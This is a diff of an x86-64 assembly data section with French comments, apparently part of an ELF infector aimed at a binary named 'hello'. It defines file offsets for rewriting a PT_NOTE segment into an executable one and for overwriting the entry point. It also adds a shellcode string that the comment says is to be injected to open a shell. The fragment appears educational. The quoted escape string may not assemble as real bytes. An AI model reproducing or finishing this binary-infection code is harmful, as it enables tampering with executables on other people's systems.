@@ -1,11 +1,13 @@
 section .data
     filename db 'hello', 0
-    octet_position equ 456 -- obtenu en effectuant un chagement manuel et en comparant les octets avec une copue de hello
-    flags_position equ 460  il s'agit de la position de octet_position auquel on ajoute. 
+    octet_position equ 456  ; afin de trouver l'octet du premier segment  ptnote, j'ai effectuer un changement manuel puis  comparé avec une copie du binaire.
+    flags_position equ 460  ; cela se trouve à 4 octets au dessus du ptype du segment ptnote.
     octetentry_position equ 24 ; Offset correct pour e_entry (64 bits)
-    new_flags dd 0x00000001 -flags d'exection = 1
-    new_value db 1 -- valeur que va prendre l'octet_position
-    newentry_adress dq 0x0338 ; adresse virtuelle obtenue en faisant la commande readelf -l mon_elf sur le terminal.
+    new_flags dd 0x00000001
+    new_value db 1
+    newentry_adress dq 0x0338 ; Utiliser dq pour une valeur 64 bits
+
+    shellcode db '\xb8\x3b\x00\x00\x00\x48\xbf\x08\x20\x40\x00\x00\x00\x00\x48\xbe\x08\x20\x40\x00\x00\x00\x00\x48\xba\x10\x20\x40\x00\x00\x00\x00\x0f\x05' ; shellcode à injecter ( ouvre simplement le shell)
 
 section .bss
     file_descriptor resq 1
